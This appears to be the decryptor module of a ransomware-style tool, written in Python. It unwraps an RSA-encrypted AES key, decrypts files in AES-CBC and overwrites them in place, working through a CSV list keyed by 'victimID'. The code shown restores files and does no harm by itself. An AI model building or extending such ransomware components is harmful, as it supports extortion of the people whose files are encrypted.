import csv
import logging
from time import sleep
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding

KEY_SIZE = 32
BLOCK_SIZE = 16

def decrypt_file(file_path, private_key):
    logging.info('Inicia la función decrypt_file.')

    with open(file_path, 'rb') as f:
        data = f.read()

    encrypted_symmetric_key = data[:256]  # Asume que la clave RSA es de 2048 bits
    iv = data[256:256+BLOCK_SIZE]
    ct = data[256+BLOCK_SIZE:]
    sleep(1)

    # Desciframos la clave simétrica con RSA
    symmetric_key = private_key.decrypt(
        encrypted_symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    logging.info('La clave simétrica ha sido descifrada con RSA.')

    # Desciframos el archivo con AES
    cipher = Cipher(algorithms.AES(symmetric_key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded_data = decryptor.update(ct) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(BLOCK_SIZE * 8).unpadder()
    data = unpadder.update(padded_data) + unpadder.finalize()
    logging.info('El archivo ha sido descifrado con AES.')

    # Guardamos el archivo descifrado
    with open(file_path, 'wb') as f:
        f.write(data)
    logging.info('Archivo descifrado guardado.')

def decrypt_files_from_csv(csv_file, private_key):
    with open(csv_file, 'r', encoding='utf-8') as csvfile:
        csv_reader = csv.reader(csvfile)
        next(csv_reader)  # Skip header row
        for row in csv_reader:
            victimID, level, file_path, file_type, extension = row
            if file_type.lower() == 'file':
                print(f'Decrypting {file_path}')
                decrypt_file(file_path, private_key)
